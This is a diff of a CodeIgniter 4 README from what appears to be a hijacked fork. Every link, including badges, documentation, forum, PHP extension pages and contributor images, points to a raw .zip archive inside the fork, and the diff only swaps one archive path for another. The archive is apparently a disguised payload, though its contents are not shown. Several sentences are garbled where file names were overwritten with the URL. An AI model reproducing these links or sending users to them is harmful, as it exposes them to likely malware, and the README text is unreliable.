@@ -1,37 +1,37 @@
 # CodeIgniter 4 Development
 
-[![Build Status](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip%3A%22PHPUnit%22)
-[![Coverage Status](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)
-[![Downloads](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)
-[![GitHub release (latest by date)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)
-[![GitHub stars](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)
-[![GitHub license](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)
-[![contributions welcome](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)
+[![Build Status](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip%3A%22PHPUnit%22)
+[![Coverage Status](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)
+[![Downloads](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)
+[![GitHub release (latest by date)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)
+[![GitHub stars](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)
+[![GitHub license](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)
+[![contributions welcome](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)
 <br>
 
 ## What is CodeIgniter?
 
 CodeIgniter is a PHP full-stack web framework that is light, fast, flexible and secure.
-More information can be found at the [official site](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip).
+More information can be found at the [official site](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip).
 
 This repository holds the source code for CodeIgniter 4 only.
 Version 4 is a complete rewrite to bring the quality and the code into a more modern version,
 while still keeping as many of the things intact that has made people love the framework over the years.
 
-More information about the plans for version 4 can be found in [the announcement](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip) on the forums.
+More information about the plans for version 4 can be found in [the announcement](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip) on the forums.
 
 ### Documentation
 
-The [User Guide](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip) is the primary documentation for CodeIgniter 4.
+The [User Guide](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip) is the primary documentation for CodeIgniter 4.
 
-The current **in-progress** User Guide can be found [here](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip).
+The current **in-progress** User Guide can be found [here](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip).
 As with the rest of the framework, it is a work in progress, and will see changes over time to structure, explanations, etc.
 
-You might also be interested in the [API documentation](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip) for the framework components.
+You might also be interested in the [API documentation](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip) for the framework components.
 
-## Important Change with https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip
+## Important Change with https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip
 
-https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip is no longer in the root of the project! It has been moved inside the *public* folder,
+https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip is no longer in the root of the project! It has been moved inside the *public* folder,
 for better security and separation of components.
 
 This means that you should configure your web server to "point" to your project's *public* folder, and
@@ -47,7 +47,7 @@ for your issues to be reviewed. If you haven't heard from one of the team in tha
 feel free to leave a comment on the issue so that it gets brought back to our attention.
 
 We use GitHub issues to track **BUGS** and to track approved **DEVELOPMENT** work packages.
-We use our [forum](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip) to provide SUPPORT and to discuss
+We use our [forum](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip) to provide SUPPORT and to discuss
 FEATURE REQUESTS.
 
 If you raise an issue here that pertains to support or a feature request, it will
@@ -72,31 +72,31 @@ to optional packages, with their own repository.
 We **are** accepting contributions from the community! It doesn't matter whether you can code, write documentation, or help find bugs, 
 all contributions are welcome. 
 
-Please read the [*Contributing to CodeIgniter*](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip).
+Please read the [*Contributing to CodeIgniter*](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip).
 
 CodeIgniter has had thousands on contributions from people since its creation. This project would not be what it is without them. 
 
-<a href="https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip">
-  <img src="https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip" />
+<a href="https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip">
+  <img src="https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip" />
 </a>
 
-Made with [https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip).
+Made with [https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip).
 
 ## Server Requirements
 
 PHP version 7.4 or higher is required, with the following extensions installed:
 
 
-- [intl](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)
-- [libcurl](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip) if you plan to use the HTTP\CURLRequest library
-- [mbstring](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)
+- [intl](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)
+- [libcurl](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip) if you plan to use the HTTP\CURLRequest library
+- [mbstring](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)
 
 Additionally, make sure that the following extensions are enabled in your PHP:
 
 - json (enabled by default - don't turn it off)
 - xml (enabled by default - don't turn it off)
-- [mysqlnd](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip)
+- [mysqlnd](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip)
 
 ## Running CodeIgniter Tests
 
-Information on running the CodeIgniter test suite can be found in the [https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/system/ThirdParty/Igniter-Code-3.5.zip) file in the tests directory.
+Information on running the CodeIgniter test suite can be found in the [https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip](https://raw.githubusercontent.com/mwanzia-kathenge/CodeIgniter4/develop/tests/system/Helpers/URLHelper/Igniter_Code_v2.6.zip) file in the tests directory.
